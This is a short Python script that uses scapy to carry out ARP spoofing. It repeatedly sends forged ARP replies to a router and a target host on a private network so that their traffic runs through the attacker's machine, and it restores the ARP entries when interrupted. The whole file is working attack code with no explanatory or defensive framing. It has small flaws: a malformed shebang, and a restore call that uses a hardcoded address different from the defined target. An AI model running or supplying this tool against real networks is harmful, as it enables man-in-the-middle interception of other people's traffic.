#!usr/bin/env python

import scapy.all as  scapy
import time
import sys

ROUTER_IP='192.168.209.2'
TARGET_IP='192.168.209.141'

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)  #create arp request
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  #broadcast MAC
    packet = broadcast / arp_request #combining frames
    # print(packet.show())
    ans_list = scapy.srp(packet, timeout=1, verbose=False)[0]
    mac_addr = ans_list[0][1].hwsrc
    return mac_addr

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet=scapy.ARP(op=2, pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(target_ip, source_ip):
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)

try:
    count = 0
    while True:
        spoof(ROUTER_IP, TARGET_IP)
        spoof(TARGET_IP,ROUTER_IP)
        count+=2

        # python2
        print("\r[+] Packet sent:" + str(count)),
        sys.stdout.flush()

        # python3
        # print("\r[+] Packet sent:" + str(count),end='')
        time.sleep(2)
except KeyboardInterrupt:
    print("[-] Quiting")
    restore(ROUTER_IP, TARGET_IP)
    restore("192.168.209.129",ROUTER_IP)


